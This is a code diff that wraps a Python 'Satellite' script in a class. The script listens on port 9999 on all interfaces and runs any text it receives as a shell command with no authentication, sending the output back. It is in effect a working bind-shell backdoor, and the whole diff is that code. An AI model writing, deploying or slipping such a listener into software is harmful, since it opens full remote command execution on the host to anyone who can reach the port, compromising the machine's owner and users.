@@ -4,36 +4,44 @@ import subprocess
 HOST = '0.0.0.0'     # Listen on all interfaces
 PORT = 9999          # Port to listen on
 
-server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-server.bind((HOST, PORT))
-server.listen(1)
+class TcpSatellite:
 
-print(f"[+] Satellite (TCP) listening on {HOST}:{PORT}")
+    def tcp_satellite(self):
 
-conn, addr = server.accept()
-print(f"[+] Connection established from {addr}")
+        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        server.bind((HOST, PORT))
+        server.listen(1)
 
-with conn:
-    while True:
-        data = conn.recv(4096)
-        if not data:
-            break
+        print(f"[+] Satellite (TCP) listening on {HOST}:{PORT}")
 
-        command = data.decode().strip()
-        print(f"[+] Received command: {command}")
+        conn, addr = server.accept()
+        print(f"[+] Connection established from {addr}")
 
-        if command.lower() in ['exit', 'quit']:
-            print("[!] Shutting down on command.")
-            break
+        with conn:
+            while True:
+                data = conn.recv(4096)
+                if not data:
+                    break
 
-        try:
-            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=10)
-            response = output.decode()
-        except subprocess.CalledProcessError as e:
-            response = e.output.decode()
-        except Exception as ex:
-            response = f"Error: {str(ex)}"
+                command = data.decode().strip()
+                print(f"[+] Received command: {command}")
 
-        conn.sendall(response.encode())
+                if command.lower() in ['exit', 'quit']:
+                    print("[!] Shutting down on command.")
+                    break
 
-server.close()
+                try:
+                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=10)
+                    response = output.decode()
+                except subprocess.CalledProcessError as e:
+                    response = e.output.decode()
+                except Exception as ex:
+                    response = f"Error: {str(ex)}"
+
+                conn.sendall(response.encode())
+
+        server.close()
+
+if __name__ == '__main__':
+    a = TcpSatellite()
+    a. tcp_satellite()
